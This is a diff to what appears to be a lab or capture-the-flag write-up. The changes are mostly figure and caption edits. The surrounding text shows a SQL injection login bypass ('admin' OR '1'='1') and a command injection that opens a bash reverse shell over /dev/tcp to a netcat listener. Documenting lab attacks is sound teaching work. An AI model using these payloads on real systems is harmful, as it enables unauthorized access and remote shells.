@@ -39,6 +39,7 @@ admin' OR '1'='1
 *Figure 2: SQL Injection Command.*
 *The password field was left completely blank.*
 
+
 **Result:** The database logic evaluated the statement as universally true, ignored the password validation parameter, and successfully authenticated entry into the panel dashboard.
 
 ---
@@ -55,6 +56,7 @@ By appending an operator payload, the system command syntax was hijacked.
 2. The following unified logical payload was delivered through the execution processing script:
    ```text
    192.168.0.21 && bash -i >& /dev/tcp/192.168.0.21/4444 0>&1
+  
    ```
 
 **Result:** The web server executed the background task and sent back an interactive reverse shell session to the listener terminal as low-privilege web execution profile `apache`.
@@ -66,8 +68,10 @@ apache
 ```
 
 <!-- 🖼️ PLACE SECOND IMAGE HERE -->
+ ![Nmap Scan Results](images/sql_command2_lvl2.png)
+*Figure 3: unified logical payload*
 ![Initial Access Foothold](foothold_lvl2.png)
-*Figure 3: Successfully catching the interactive shell session using a Netcat listener.*
+*Figure 4: Successfully catching the interactive shell session using a Netcat listener.*
 
 ---
 
